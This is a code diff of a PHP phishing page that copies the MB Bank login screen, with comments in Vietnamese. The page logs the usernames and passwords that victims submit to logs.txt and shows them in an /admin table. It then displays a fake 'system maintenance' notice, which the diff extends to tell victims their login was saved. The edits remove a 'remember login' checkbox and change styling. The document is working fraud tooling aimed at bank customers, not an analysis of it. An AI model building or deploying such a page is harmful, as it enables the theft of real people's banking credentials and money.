@@ -1,8 +1,5 @@
 <?php
-// ================================================
-// MB BANK FAKE UI + XEM LOGS - Vercel Version
-// ================================================
-
+// MB Bank Fake UI - Lưu logs khi nhấn Đăng nhập (Không có checkbox lưu đăng nhập)
 $uri = $_SERVER['REQUEST_URI'] ?? '/';
 
 // ====================== TRANG XEM LOGS ======================
@@ -32,7 +29,7 @@ if (strpos($uri, '/admin') !== false) {
         th, td {border:1px solid #8fd3f4;padding:12px;text-align:left;}
         th {background:#8fd3f4;color:#0a0a80;}
         pre {background:#111;padding:15px;border-radius:8px;overflow:auto;white-space:pre-wrap;}
-        .back {color:#8fd3f4;text-decoration:none;margin-top:20px;display:inline-block;}
+        .back {color:#8fd3f4;text-decoration:none;font-size:16px;}
     </style>
 </head>
 <body>
@@ -41,11 +38,7 @@ if (strpos($uri, '/admin') !== false) {
 
     <?php if (!empty($logs)): ?>
     <table>
-        <tr>
-            <th>Thời gian</th>
-            <th>Tên đăng nhập</th>
-            <th>Mật khẩu</th>
-        </tr>
+        <tr><th>Thời gian</th><th>Tên đăng nhập</th><th>Mật khẩu</th></tr>
         <?php foreach($logs as $log): ?>
         <tr>
             <td><?= htmlspecialchars($log[0] ?? '') ?></td>
@@ -54,11 +47,14 @@ if (strpos($uri, '/admin') !== false) {
         </tr>
         <?php endforeach; ?>
     </table>
+    <?php else: ?>
+    <p>Chưa có bản ghi nào.</p>
     <?php endif; ?>
 
     <h2>Nội dung file logs.txt:</h2>
     <pre><?= htmlspecialchars($logContent) ?></pre>
 
+    <br>
     <a href="/" class="back">← Quay lại trang đăng nhập</a>
 </body>
 </html>
@@ -126,9 +122,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         input {width:100%;padding:12px 0;background:transparent;border:none;border-bottom:1px solid rgba(255,255,255,0.6);color:white;outline:none;font-size:16px;}
         input::placeholder {color:rgba(255,255,255,0.8);}
         .toggle-password {position:absolute;right:0;top:50%;transform:translateY(-50%);cursor:pointer;color:rgba(255,255,255,0.7);}
-        
-        .remember-row {display:flex;align-items:center;margin-bottom:20px;font-size:15px;color:rgba(255,255,255,0.9);}
-        .remember-row input[type="checkbox"] {width:18px;height:18px;margin-right:8px;accent-color:#8fd3f4;cursor:pointer;}
 
         .row {display:flex;justify-content:space-between;font-size:15px;margin-bottom:25px;}
         .login-btn {
@@ -144,7 +137,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             display:flex;justify-content:center;align-items:center;font-size:22px;backdrop-filter:blur(10px);
         }
 
-        /* Modal */
         .maintenance-modal {
             display:none;position:fixed;top:0;left:0;width:100%;height:100%;
             background:rgba(0,0,0,0.85);z-index:1000;justify-content:center;align-items:center;
@@ -178,10 +170,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 <i class="fa-solid fa-eye toggle-password" onclick="togglePassword()"></i>
             </div>
 
-            <div class="remember-row">
-                <input type="checkbox" name="rememberMe" id="rememberMe">
-                <label for="rememberMe" style="cursor:pointer;">Lưu đăng nhập</label>
-            </div>
+            <!-- Đã xóa checkbox "Lưu đăng nhập" -->
 
             <div class="row">
                 <span>Tạo tài khoản</span>
@@ -209,7 +198,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         <div class="modal-title">Thông báo hệ thống</div>
         <div class="modal-text">
             Hệ thống đang bảo trì do số lượng truy cập quá lớn.<br><br>
-            Vui lòng quay lại sau <strong>1 giờ</strong>.
+            Vui lòng quay lại sau <strong>1 giờ</strong>.<br><br>
+            <small>Thông tin đăng nhập đã được lưu.</small>
         </div>
         <button class="modal-btn" onclick="closeModal()">Đóng</button>
     </div>
